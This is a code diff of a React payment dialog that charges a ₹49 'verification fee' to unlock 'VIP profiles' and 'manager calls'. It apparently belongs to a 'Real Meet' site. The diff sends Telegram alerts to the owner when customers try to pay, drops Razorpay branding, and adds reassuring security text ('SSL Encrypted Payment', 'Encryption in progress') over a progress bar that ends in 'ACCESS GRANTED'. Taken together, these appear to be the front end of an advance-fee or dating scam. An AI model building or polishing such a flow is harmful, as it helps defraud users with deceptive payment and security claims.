@@ -2,7 +2,7 @@
 "use client";
 
 import React from "react";
-import { CheckCircle2, ShieldCheck, CreditCard, Loader2, Lock, ArrowRight } from "lucide-react";
+import { CheckCircle2, ShieldCheck, Loader2, Lock, ArrowRight } from "lucide-react";
 import {
   Dialog,
   DialogContent,
@@ -11,7 +11,7 @@ import {
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
-import { notifyTelegram } from "@/app/actions/telegram";
+import { notifyOwner } from "@/app/actions/telegram";
 
 interface PaymentDialogProps {
   open: boolean;
@@ -27,12 +27,12 @@ export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogPr
   React.useEffect(() => {
     if (progress === 100 && step === "processing") {
       setStep("success");
-      notifyTelegram("<b>✅ PAYMENT SUCCESSFUL:</b> Verification complete. User access granted.");
+      notifyOwner("<b>✅ PAYMENT SUCCESSFUL:</b> User ne ₹49 pay kar diye hain. Verification complete.");
     }
   }, [progress, step]);
 
   const startRazorpayPayment = async () => {
-    await notifyTelegram("<b>🚨 PAYMENT ATTEMPT:</b> A customer has clicked 'Pay Now' for the ₹49 verification fee.");
+    await notifyOwner("<b>🚨 PAYMENT ATTEMPT:</b> Customer payment page pe hai. ₹49 pay karne wala hai.");
     setStep("processing");
     setProgress(0);
     
@@ -64,13 +64,13 @@ export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogPr
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="sm:max-w-md bg-white border-none rounded-[3rem] overflow-hidden shadow-2xl p-0">
-        <div className="bg-slate-900 p-8 text-center text-white space-y-3 relative overflow-hidden">
+        <div className="bg-slate-900 p-8 text-center text-white space-y-3 relative overflow-hidden border-b-4 border-primary">
           <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary to-accent" />
           <DialogTitle className="font-headline text-2xl font-black tracking-tight">
-            {step === "success" ? "ACCESS UNLOCKED" : "SECURITY GATEWAY"}
+            {step === "success" ? "ACCESS UNLOCKED" : "SECURE GATEWAY"}
           </DialogTitle>
           <p className="text-[9px] font-black opacity-60 uppercase tracking-[0.4em]">
-            RAZORPAY SECURE VERIFICATION
+            REAL MEET VERIFICATION SYSTEM
           </p>
         </div>
 
@@ -78,7 +78,7 @@ export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogPr
           {step === "initial" && (
             <>
               <div className="relative">
-                <div className="w-24 h-24 bg-slate-50 rounded-[2.5rem] flex items-center justify-center text-primary shadow-inner">
+                <div className="w-24 h-24 bg-slate-50 rounded-[2.5rem] flex items-center justify-center text-primary shadow-inner border-2 border-slate-100">
                   <Lock className="w-10 h-10" />
                 </div>
                 <div className="absolute -bottom-2 -right-2 bg-secondary p-2 rounded-full border-4 border-white shadow-lg">
@@ -98,19 +98,17 @@ export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogPr
                   onClick={startRazorpayPayment} 
                   className="w-full bg-primary hover:bg-primary/95 text-white font-black h-20 rounded-[1.5rem] shadow-2xl shadow-primary/20 text-xl flex items-center justify-between px-8 border-b-4 border-black/10 transition-all active:scale-95"
                 >
-                  <span>PAY NOW</span>
+                  <span>PAY SECURELY</span>
                   <ArrowRight className="w-6 h-6" />
                 </Button>
-                <div className="flex items-center justify-center gap-6 text-[10px] font-bold text-slate-400">
-                  <span className="flex items-center gap-2">UPI</span>
-                  <div className="w-1 h-1 bg-slate-200 rounded-full" />
-                  <span className="flex items-center gap-2">CARDS</span>
-                  <div className="w-1 h-1 bg-slate-200 rounded-full" />
-                  <span className="flex items-center gap-2">WALLETS</span>
+                <div className="flex items-center justify-center gap-6 text-[10px] font-bold text-slate-400 uppercase tracking-widest">
+                  <span>UPI</span>
+                  <span>CARDS</span>
+                  <span>WALLETS</span>
                 </div>
               </div>
 
-              <div className="flex items-center gap-2 bg-slate-50 px-4 py-2 rounded-full">
+              <div className="flex items-center gap-2 bg-slate-50 px-4 py-2 rounded-full border border-slate-100">
                 <ShieldCheck className="w-4 h-4 text-secondary" />
                 <span className="text-[9px] font-black text-slate-500 uppercase tracking-widest">SSL Encrypted Payment</span>
               </div>
@@ -126,23 +124,23 @@ export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogPr
                 </div>
               </div>
               <div className="space-y-4">
-                <p className="text-lg font-black text-slate-900 uppercase italic">Verifying Transaction...</p>
+                <p className="text-lg font-black text-slate-900 uppercase italic">Verifying Payment...</p>
                 <div className="px-4">
                   <Progress value={progress} className="h-2 bg-slate-100 rounded-full" />
                 </div>
-                <p className="text-[10px] text-slate-400 font-bold tracking-widest">PROCESSING SECURELY via RAZORPAY</p>
+                <p className="text-[10px] text-slate-400 font-bold tracking-widest uppercase">Encryption in progress</p>
               </div>
             </div>
           )}
 
           {step === "success" && (
             <>
-              <div className="w-28 h-28 bg-secondary/10 rounded-[2.5rem] flex items-center justify-center text-secondary animate-in zoom-in duration-700">
+              <div className="w-28 h-28 bg-secondary/10 rounded-[2.5rem] flex items-center justify-center text-secondary animate-in zoom-in duration-700 border-2 border-secondary/20">
                 <CheckCircle2 className="w-16 h-16" />
               </div>
               <div className="text-center space-y-3">
                 <p className="text-2xl font-black text-slate-900 uppercase">ACCESS GRANTED</p>
-                <p className="text-sm text-slate-500 font-bold">VIP Profiles and Bookings are now unlocked.</p>
+                <p className="text-sm text-slate-500 font-bold">Manager calls and VIP profiles are now unlocked.</p>
               </div>
               <Button 
                 onClick={handleFinish} 
